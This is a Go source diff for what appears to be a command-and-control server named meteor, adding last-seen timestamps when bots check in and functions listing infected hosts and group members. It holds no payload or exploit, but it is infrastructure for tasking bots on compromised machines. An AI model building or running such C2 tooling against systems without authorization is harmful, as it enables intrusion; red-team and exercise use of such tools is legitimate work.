@@ -8,6 +8,7 @@ import (
 	"github.com/degenerat3/meteor/meteor/pbuf"
 	goUUID "github.com/google/uuid"
 	"strconv"
+	"time"
 )
 
 func regBotUtil(prot *mcs.MCS) int32 {
@@ -213,6 +214,7 @@ func addResultUtil(prot *mcs.MCS) int32 {
 }
 
 func botCheckinUtil(prot *mcs.MCS) (int32, []*mcs.Action) {
+	checkTime := int(time.Now().Unix())
 	var actList []*mcs.Action
 	uuid := prot.GetUuid()
 	if uuid == "" {
@@ -222,10 +224,12 @@ func botCheckinUtil(prot *mcs.MCS) (int32, []*mcs.Action) {
 	if err != nil {
 		return 400, actList // unknown bot
 	}
+	botObj.Update().SetLastSeen(checkTime)
 	hostObj, err := botObj.QueryInfecting().Only(ctx)
 	if err != nil {
 		return 400, actList // bot assoc w/ unknown host
 	}
+	hostObj.Update().SetLastSeen(checkTime)
 	acts, err := hostObj.QueryActions().Where(action.Queued(false)).All(ctx)
 	if err != nil {
 		errLog.Printf("Error querying actions: '%s", err.Error())
@@ -317,4 +321,61 @@ func listResultUtil(uuid string) string {
 		return "Action not yet returned\n"
 	}
 	return action.Result
+}
+
+func listHostUtil(prot *mcs.MCS) string {
+	hn := prot.GetHostname()
+	hostobj, err := DBClient.Host.
+		Query().
+		Where(host.Hostname(hn)).
+		Only(ctx)
+	if err != nil {
+		return "Unknown host"
+	}
+	ls := convertLastSeen(hostobj.LastSeen)
+	grps, err := hostobj.
+		QueryMember().
+		All(ctx)
+	if err != nil {
+		return "Error querying host"
+	}
+
+	hstr := "Host='" + hn + "', LastSeen='" + ls + "', groups=["
+
+	for _, g := range grps {
+		gs := "'" + g.Name + "',"
+		hstr = hstr + gs
+	}
+	hstr = hstr + "]"
+
+	return hstr + "\n"
+}
+
+func listGroupUtil(prot *mcs.MCS) string {
+	gn := prot.GetGroupname()
+	grpobj, err := DBClient.Group.
+		Query().
+		Where(group.Name(gn)).
+		Only(ctx)
+	if err != nil {
+		return "unknown group"
+	}
+	grpStr := "Members of " + gn + ":\n"
+	mems, err := grpobj.
+		QueryMembers().
+		All(ctx)
+	if err != nil {
+		return "Error querying group"
+	}
+	for _, hst := range mems {
+		hstr := "	- " + hst.Hostname
+		grpStr = grpStr + hstr
+	}
+	return grpStr + "\n"
+}
+
+func convertLastSeen(ls int) string {
+	ut := int64(ls)
+	t := time.Unix(ut, 0)
+	return t.Format(time.UnixDate)
 }
